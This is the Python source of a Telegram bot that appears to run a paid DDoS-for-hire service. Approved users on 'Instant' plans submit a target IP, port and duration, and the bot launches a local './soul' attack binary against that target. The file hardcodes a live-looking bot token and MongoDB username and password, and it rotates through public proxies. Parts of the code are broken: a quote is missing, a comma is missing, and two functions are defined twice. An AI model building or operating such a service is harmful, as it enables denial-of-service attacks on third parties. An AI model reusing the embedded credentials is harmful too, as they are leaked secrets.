import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import random
from subprocess import Popen
from threading import Thread
import asyncio
import aiohttp
import ipaddress
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

loop = asyncio.get_event_loop()

TOKEN = 7377608146:AAF489i68QQK5weS0IIyunBZTChu8hxl8rQ'
MONGO_URI = 'mongodb+srv://Rohit:rohit2001@cluster0.lyxza.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0'
FORWARD_CHANNEL_ID = -1002276271143
CHANNEL_ID = -1002276271143
error_channel_id = -1002276271143

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['soul']
users_collection = db.users

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # Blocked ports list

async def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    await start_asyncio_loop()

def update_proxy():
    proxy_list = [
           "https://202.62.10.210:8080",
"https://202.62.10.210:8080",
"https://181.41.219.69:9999",
"https://182.255.45.165:8080",
"https://223.204.55.24:8080",
"https://14.101.41.162:8080",
"https://81.31.186.33:80",
"https://202.159.42.246:80",
"https://203.195.153.200:80"
"https://154.73.28.129:8080",
"https://67.43.227.227:23099",
"https://67.43.227.227:11839",
"https://67.213.212.39:58383",
"https://134.35.22.246:8080",
"https://68.71.249.153:48606",
"https://130.185.77.63:80",
"https://181.115.75.102:5678",
"https://11.171.239.74:1337",
"https://148.72.212.198:16965",
"https://138.94.236.137:8080",
"https://150.220.8.228:64312",
"https://103.191.250.130:8083",
"https://64.95.163.68:1337",
"https://67.43.227.227:3217",
"https://132.148.245.112:36149",
"https://103.194.172.182:8081",
"https://116.110.211.150:10001",
"https://81.12.111.130:8080",
"https://162.0.220.216:40759",
"https://103.227.61.51:8899",
"https://136.226.255.23:10841",
"https://123.169.118.116:1080",
"https://43.159.37.252:20357",
"https://167.42.193.81:17171",
"https://3.145.174.254:3128",
"https://91.239.216.51:6850",
"https://61.90.65.201:8888",
"https://198.143.177.158:3128",
"https://103.187.117.7:8080",
"https://72.10.160.91:8289",
"https://41.242.69.196:5678",
"https://202.235.15.34:8080",
"https://248.99.31.246:1337",
"https://72.10.160.91:2893",
"https://217.52.126.182:80",
"https://203.192.217.6:8080",
"https://27.254.46.194:80",
"https://103.101.99.45:8080",
"https://136.226.255.23:10319",
"https://66.29.128.246:28446",
"https://167.172.159.43:19466",
"https://167.172.159.43:47136",
"https://39.101.65.228:1337",
"https://93.127.163.112:80",
"https://103.125.174.17:7777",
"https://136.226.251.19:10230",
"https://41.254.48.66:1976",
"https://181.12.80.21:12000",
"https://190.2.142.30:11438",
"https://103.115.255.209:36331",
"https://8.215.3.250:8081",
"https://200.68.13.26:46903",
"https://121.200.62.246:4153",
"https://109.123.254.43:3569",
"https://130.22.190.239:3128",
"https://189.240.60.163:9090",
"https://163.47.35.102:4145",
"https://144.126.142.132:60294",
"https://98.162.25.16:4145",
"https://78.112.198.31:80",
"https://103.130.218.135:5970",
"https://195.74.72.111:5678",
"https://138.59.151.162:8080",
"https://187.29.243.107:3128",
"https://23.105.170.34:19801",
"https://117.102.115.158:4153",
"https://67.43.236.20:13775",
"https://183.164.194.17:8080",
"https://126.76.59.55:4152",
"https://67.213.210.60:49054",
"https://187.122.105.181:4153",
"https://46.174.234.189:56627",
"https://185.122.168.232:30952",
"https://105.234.156.109:4145",
"https://170.80.91.2:4145",
"https://122.200.19.100:80",
"https://54.179.92.195:3128",
"https://162.0.220.214:27734",
"https://188.121.128.250:9080",
"https://45.89.19.20:10119",
"https://117.54.114.32:80",
"https://180.76.237.75:80",
"https://94.23.222.122:56759",
"https://206.233.164.66:58394",
"https://206.233.169.85:58394"

    ]
    proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {'https': proxy}
    logging.info("Proxy updated successfully.")

@bot.message_handler(commands=['update_proxy'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, "Proxy updated successfully.")
    except Exception as e:
        bot.send_message(chat_id, f"Failed to update proxy: {e}")

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./soul {target_ip} {target_port} {duration} 60")
    await process.communicate()

def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id, CHANNEL_ID)
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == '/approve':
        if plan == 1:  # Instant Plan 🧡
            if users_collection.count_documents({"plan": 1}) >= 99:
                bot.send_message(chat_id, "*Approval failed: Instant Plan 🧡 limit reached (99 users).*", parse_mode='Markdown')
                return
        elif plan == 2:  # Instant++ Plan 💥
            if users_collection.count_documents({"plan": 2}) >= 499:
                bot.send_message(chat_id, "*Approval failed: Instant++ Plan 💥 limit reached (499 users).*", parse_mode='Markdown')
                return

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
    else:  # disapprove
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')
@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "You are not approved to use this bot. Please contact the administrator.")
            return

        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
            bot.send_message(chat_id, "Your Instant Plan 🧡 is currently not available due to limit reached.")
            return

        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
            bot.send_message(chat_id, "Your Instant++ Plan 💥 is currently not available due to limit reached.")
            return

        bot.send_message(chat_id, "Enter the target IP, port, and duration (in seconds) separated by spaces.")
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*You are not approved to use this bot. Please contact the administrator.*", parse_mode='Markdown')
            return

        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
            bot.send_message(chat_id, "*Your Instant Plan 🧡 is currently not available due to limit reached.*", parse_mode='Markdown')
            return

        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
            bot.send_message(chat_id, "*Your Instant++ Plan 💥 is currently not available due to limit reached.*", parse_mode='Markdown')
            return

        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*Invalid command format. Please use: /Attack target_ip target_port time*", parse_mode='Markdown')
            return
        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"*Attack started 💥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

@bot.message_handler(commands=['start'])
def send_welcome(message):
    # Create a markup object
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)

    # Create buttons
    btn1 = KeyboardButton("Instant Plan 🧡")
    btn2 = KeyboardButton("Atteck")
    btn3 = KeyboardButton("Canary Download✔️")
    btn4 = KeyboardButton("My Account🏦")
    btn5 = KeyboardButton("Help❓")
    btn6 = KeyboardButton("Contact admin✔️")

    # Add buttons to the markup
    markup.add(btn2)

    bot.send_message(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.text == "Instant Plan 🧡":
        bot.reply_to(message, "*Instant Plan selected*", parse_mode='Markdown')
    elif message.text == "Atteck":
        bot.reply_to(message, "*Atteck selected*", parse_mode='Markdown')
        attack_command(message)
    #elif message.text == "Canary Download✔️":
        #bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/SOULCRACKS/10599*", parse_mode='Markdown')#
    elif message.text == "My Account🏦":
        user_id = message.from_user.id
        user_data = users_collection.find_one({"user_id": user_id})
        if user_data:
            username = message.from_user.username
            plan = user_data.get('plan', 'N/A')
            valid_until = user_data.get('valid_until', 'N/A')
            current_time = datetime.now().isoformat()
            response = (f"*USERNAME: {username}\n"
                        f"Plan: {plan}\n"
                        f"Valid Until: {valid_until}\n"
                        f"Current Time: {current_time}*")
        else:
            response = "*No account information found. Please contact the administrator.*"
        bot.reply_to(message, response, parse_mode='Markdown')
    elif message.text == "Help❓":
        bot.reply_to(message, "*Help selected*", parse_mode='Markdown')
    elif message.text == "Contact admin✔️":
        bot.reply_to(message, "*Contact admin selected*", parse_mode='Markdown')
    else:
        bot.reply_to(message, "*Invalid option*", parse_mode='Markdown')

if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Starting Codespace activity keeper and Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)
